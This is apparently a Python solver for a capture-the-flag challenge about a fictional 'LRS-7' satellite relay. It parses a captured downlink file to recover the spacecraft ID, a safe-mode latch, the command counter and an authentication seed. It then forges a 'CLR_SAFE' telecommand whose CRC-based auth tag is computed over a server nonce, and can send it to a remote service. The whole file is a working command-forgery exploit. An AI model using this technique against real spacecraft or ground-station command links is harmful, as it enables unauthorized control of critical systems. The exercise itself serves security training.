#!/usr/bin/env python3
from __future__ import annotations

import argparse
from dataclasses import dataclass
from pathlib import Path
import socket
import struct


SYNC_MARKER = bytes.fromhex("1ACFFC1D")


@dataclass(frozen=True)
class RelayState:
    spacecraft_id: int
    safe_latch: int
    last_counter: int
    auth_seed: int


def crc16_ccitt_false(data: bytes) -> int:
    crc = 0xFFFF
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc


def crc16_x25(data: bytes) -> int:
    crc = 0xFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = ((crc >> 1) ^ 0x8408) & 0xFFFF
            else:
                crc >>= 1
    return (~crc) & 0xFFFF


def infer_frame_size(blob: bytes) -> int:
    positions = []
    start = 0
    while True:
        index = blob.find(SYNC_MARKER, start)
        if index < 0:
            break
        positions.append(index)
        start = index + 1
    gaps = [b - a for a, b in zip(positions, positions[1:])]
    if not gaps:
        raise ValueError("sync marker not found often enough to infer frame size")
    return max(set(gaps), key=gaps.count)


def recover_state(downlink: Path) -> RelayState:
    blob = downlink.read_bytes()
    frame_size = infer_frame_size(blob)
    spacecraft_id = safe_latch = last_counter = auth_seed = None

    for offset in range(0, len(blob), frame_size):
        frame = blob[offset : offset + frame_size]
        if len(frame) != frame_size or frame[:4] != SYNC_MARKER:
            continue

        primary_word = struct.unpack(">H", frame[4:6])[0]
        spacecraft_id = (primary_word >> 6) & 0x03FF

        packet_zone = frame[10:58]
        if len(packet_zone) < 12:
            continue

        packet_id = struct.unpack(">H", packet_zone[:2])[0]
        packet_length = struct.unpack(">H", packet_zone[4:6])[0] + 7
        payload = packet_zone[12:packet_length]
        apid = packet_id & 0x07FF

        if apid == 0x121 and len(payload) >= 6:
            safe_latch = int.from_bytes(payload[2:4], "big")
            last_counter = int.from_bytes(payload[4:6], "big")
        elif apid == 0x1A1 and len(payload) >= 3:
            auth_seed = int.from_bytes(payload[1:3], "big")

    if None in (spacecraft_id, safe_latch, last_counter, auth_seed):
        raise ValueError("incomplete state: downlink did not expose all required fields")

    return RelayState(
        spacecraft_id=spacecraft_id,
        safe_latch=safe_latch,
        last_counter=last_counter,
        auth_seed=auth_seed,
    )


def build_tc_frame(state: RelayState, nonce: int) -> bytes:
    primary_word = (state.spacecraft_id << 6) | (0 << 3) | (2 << 1) | 1
    tc_counter = (state.last_counter + 1) & 0xFFFF
    segment_header = 0xC1
    opcode = 0x52
    argument = state.safe_latch

    tc_header_and_data = struct.pack(
        ">HHBBH",
        primary_word,
        tc_counter,
        segment_header,
        opcode,
        argument,
    )
    auth_material = (
        struct.pack(">I", nonce)
        + tc_header_and_data
        + struct.pack(">H", state.auth_seed)
    )
    auth_tag = crc16_x25(auth_material)

    frame_without_crc = tc_header_and_data + struct.pack(">H", auth_tag)
    frame_crc = crc16_ccitt_false(frame_without_crc)
    return frame_without_crc + struct.pack(">H", frame_crc)


def parse_nonce(line: bytes) -> int:
    if not line.startswith(b"NONCE "):
        raise ValueError(f"unexpected service nonce line: {line!r}")
    return int(line.split()[1], 16)


def submit_frame(host: str, port: int, state: RelayState) -> bytes:
    with socket.create_connection((host, port), timeout=10) as sock:
        stream = sock.makefile("rwb", buffering=0)
        banner = stream.readline()
        nonce_line = stream.readline()
        prompt = stream.readline()
        nonce = parse_nonce(nonce_line.strip())
        frame = build_tc_frame(state, nonce)
        stream.write(frame.hex().upper().encode("ascii") + b"\n")
        response = stream.read()
    return banner + nonce_line + prompt + response


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Recover LRS-7 downlink state and build the CLR_SAFE telecommand"
    )
    parser.add_argument(
        "--downlink",
        type=Path,
        default=Path(__file__).resolve().parents[1] / "Challenge" / "relay_downlink.bin",
    )
    parser.add_argument("--nonce", help="service nonce as an 8-hex-digit value")
    parser.add_argument("--connect", metavar=("HOST", "PORT"), nargs=2)
    args = parser.parse_args()

    state = recover_state(args.downlink)
    print("[+] Recovered downlink state")
    print(f"    spacecraft_id = {state.spacecraft_id} (0x{state.spacecraft_id:03x})")
    print(f"    safe_latch    = 0x{state.safe_latch:04x}")
    print(f"    last_counter  = 0x{state.last_counter:04x}")
    print(f"    auth_seed     = 0x{state.auth_seed:04x}")

    if args.nonce:
        nonce = int(args.nonce, 16)
        frame = build_tc_frame(state, nonce)
        print(f"[+] TC frame for nonce 0x{nonce:08x}")
        print(frame.hex().upper())

    if args.connect:
        host, port_text = args.connect
        response = submit_frame(host, int(port_text), state)
        print("[+] Service transcript")
        print(response.decode("ascii", errors="replace"), end="")


if __name__ == "__main__":
    main()
